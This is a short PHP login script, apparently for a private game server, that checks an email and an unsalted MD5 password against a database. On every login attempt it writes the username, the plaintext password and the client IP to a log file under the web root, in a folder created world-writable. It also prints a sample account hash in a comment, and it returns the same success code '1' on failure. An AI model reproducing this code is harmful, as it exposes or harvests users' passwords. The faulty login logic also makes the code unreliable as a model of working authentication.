<?php
session_start();
define('Tu4nMR@PRoKAK4','Fuck You',true);
include_once("../connect.php");

 function wh_log($log_msg) {
    $log_filename = $_SERVER['DOCUMENT_ROOT']."/log";
    if (!file_exists($log_filename))
    {
        // create directory/folder uploads.
        mkdir($log_filename, 0777, true);
    }
    $log_file_data = $log_filename.'/log_' . date('d-M-Y') . '.log';
    file_put_contents($log_file_data, $log_msg . "\n", FILE_APPEND);
}
//1|vinhkosd|71B1ABB01462F7C3DF4E06FF9E49F119
//return type code|user|pass_md5
/*
output:
	*code 1 -> success
	*input user
	*md5 pass
input:
	["user"] = user,
	["pass"] = pass,
*/
//var_dump($_POST)
$UserName = $_POST['user'];
$Password = md5($_POST['pass']);
$ip=getIP();
wh_log('{logging}-{username}='.$UserName.'{password}='.$_POST['pass'].'{ip}='.$ip);
$time = gmdate("H:i|d/m", time() + 3600*($timezone+date("I")));
$params = array($UserName, $Password);
$qshop = @$data->queryWithParam("Select UserId,Email,IsBan from Mem_Account Where Email = ? and Password = ?",$params);

if(@$data->query_num($qshop) == 1 && @$data->query_array($qshop)['IsBan'] == 'False') {
	// $info = @$data->query_array($qshop);
	// $_SESSION['ShopID']   = $info['UserId'];
	// $_SESSION['Username'] = $info['UserName'];
	// $_SESSION['Userpass'] = $info['Password'];
	// $_SESSION['IDServer'] = $server;
	// $_SESSION['DataSQL'] = 'Db_Tank';
	//@$data->query("update Sys_Users_Detail set ActiveIP = '$ip'");
	$array = array("1", $UserName, $Password);
	echo join("|",$array);
}
else {
	echo '1|Tài khoản hoặc mật khẩu không đúng';
}

?>